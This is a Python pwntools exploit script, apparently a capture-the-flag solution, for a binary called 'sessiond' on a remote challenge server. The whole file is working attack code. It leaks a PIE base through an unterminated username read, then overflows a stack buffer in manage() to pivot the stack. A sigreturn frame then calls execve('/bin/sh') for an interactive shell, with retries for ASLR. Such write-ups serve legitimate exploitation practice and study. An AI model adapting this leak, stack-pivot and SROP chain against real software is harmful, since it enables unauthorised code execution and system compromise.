#!/usr/bin/env python3
from pwn import *

# === CONFIGURATION ===
BINARY = "./sessiond/chall"
HOST, PORT = "0.cloud.chals.io", 33543

context.binary = elf = ELF(BINARY)
context.log_level = 'info'

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='''
            b *$rebase(0x1392)
            b *$rebase(0x137e)
            c
        ''')
    else:
        return process(BINARY)

# === OFFSETS ===
# Global buffers (BSS):
#   0x4060 = username (16 bytes)
#   0x4070 = session pointer (set to &0x4080 in login)
#   0x4080 = session data buffer (0x210 bytes)
#   0x4290 = size variable (4 bytes)
#
# manage() stack:
#   rbp-0x200 = local buffer s1
#   rbp       = saved rbp
#   rbp+0x8   = return address
#
# Vulnerability: manage allows size up to 0x210 but stack buffer is 0x200
#   → 16-byte overflow: 8 bytes saved rbp + 8 bytes return address
#
# Gadgets (hidden in status function):
#   0x127c: pop rax; ret
#   0x127e: syscall; ret
#   0x1392: leave; ret

def exploit():
    io = get_process()

    # ========================================
    # Step 1: Leak PIE via login
    # login reads 16 bytes into 0x4060 (username)
    # then printf("Logged in as %s", 0x4060)
    # Since 0x4070 contains ptr to 0x4080 (PIE addr),
    # filling all 16 bytes without null → printf leaks the pointer
    # ========================================
    io.recvuntil(b'# ')
    io.sendline(b'login')
    io.recvuntil(b'Enter username: ')
    io.send(b'A' * 16)  # no null terminator → leak continues into 0x4070

    io.recvuntil(b'Logged in as ' + b'A' * 16)
    leaked = io.recvuntil(b'\n', drop=True)

    # The pointer is PIE_base + 0x4080 (little-endian, top bytes are 0x00)
    # Need at least 5 bytes for a usable leak (25% chance of null at byte 1)
    if len(leaked) < 5:
        log.warn(f'Only {len(leaked)} bytes leaked (null byte in address). Retry!')
        io.close()
        return False

    pie_leak = u64(leaked[:6].ljust(8, b'\x00'))
    pie_base = pie_leak - 0x4080
    log.info(f'PIE leak:  {hex(pie_leak)}')
    log.info(f'PIE base:  {hex(pie_base)}')

    # Check for bad bytes (0x0a) in addresses we'll use
    check_addrs = [pie_base + off for off in [0x127c, 0x127e, 0x1392, 0x4080]]
    for addr in check_addrs:
        if b'\x0a' in p64(addr)[:6]:
            log.warn(f'Address {hex(addr)} contains 0x0a. Retry!')
            io.close()
            return False

    # Gadget addresses
    pop_rax_ret = pie_base + 0x127c
    syscall_ret = pie_base + 0x127e
    leave_ret   = pie_base + 0x1392
    global_buf  = pie_base + 0x4080

    log.info(f'pop rax:   {hex(pop_rax_ret)}')
    log.info(f'syscall:   {hex(syscall_ret)}')
    log.info(f'leave;ret: {hex(leave_ret)}')
    log.info(f'global:    {hex(global_buf)}')

    # ========================================
    # Step 2: SROP via manage overflow
    # Plan:
    #   1. fgets reads 0x20f bytes into global buffer at 0x4080
    #   2. memcpy copies 0x210 bytes to stack → overflows saved rbp + ret
    #   3. Overwrite saved rbp = global_buf → stack pivot target
    #   4. Overwrite ret = leave;ret → triggers pivot
    #   5. Pivoted stack runs: pop rax(15) → syscall(sigreturn) → execve
    # ========================================
    io.recvuntil(b'# ')
    io.sendline(b'manage')
    io.recvuntil(b'Size: ')
    io.sendline(str(0x210).encode())
    io.recvuntil(b'Data: ')

    # Where to place "/bin/sh" in the global buffer
    binsh_offset = 0x1a0
    binsh_addr = global_buf + binsh_offset

    # Build sigreturn frame
    frame = SigreturnFrame(kernel='amd64')
    frame.rax = constants.SYS_execve  # 59
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret
    frame.rsp = global_buf + 0x200  # valid writable address

    # Build payload in global buffer layout:
    # [0x000] fake rbp (consumed by leave's pop rbp)
    # [0x008] pop rax; ret
    # [0x010] 15 (SYS_rt_sigreturn)
    # [0x018] syscall; ret
    # [0x020] sigreturn frame (248 bytes)
    # [0x1a0] "/bin/sh\0"
    # [0x200] saved rbp = global_buf (pivot target)
    # [0x208] ret addr = leave;ret (trigger pivot)

    payload  = p64(0xdeadbeef)        # 0x000: fake rbp (doesn't matter)
    payload += p64(pop_rax_ret)       # 0x008: pop rax; ret
    payload += p64(15)                # 0x010: SYS_rt_sigreturn
    payload += p64(syscall_ret)       # 0x018: syscall; ret
    payload += bytes(frame)           # 0x020: sigreturn frame

    # Pad and place /bin/sh at offset 0x1a0
    payload = payload.ljust(binsh_offset, b'\x00')
    payload += b'/bin/sh\0'

    # Pad to offset 0x200 (saved rbp)
    payload = payload.ljust(0x200, b'\x00')

    # Overflow: saved rbp + return address
    payload += p64(global_buf)        # saved rbp → pivot target
    payload += p64(leave_ret)         # ret → leave;ret → pivot

    # fgets reads 0x20f bytes max, null-terminates at 0x20f
    # The MSB of leave_ret at offset 0x20f will be overwritten with 0x00
    # This is fine since PIE addresses have 0x00 as MSB
    assert len(payload) == 0x210

    # Check for newlines in payload
    if b'\x0a' in payload[:0x20f]:
        positions = [i for i, b in enumerate(payload[:0x20f]) if b == 0x0a]
        log.warn(f'Payload contains 0x0a at positions: {positions}')
        log.warn('fgets will stop early. Retry with different ASLR!')
        io.close()
        return False

    # Send payload (fgets stops at \n, so trim to 0x20f and send \n)
    io.send(payload[:0x20f] + b'\n')

    log.success('Payload sent! Waiting for shell...')
    time.sleep(0.5)

    io.interactive()
    return True

if __name__ == "__main__":
    for attempt in range(20):
        log.info(f'Attempt {attempt + 1}')
        try:
            if exploit():
                break
        except Exception as e:
            log.warn(f'Failed: {e}')
            continue
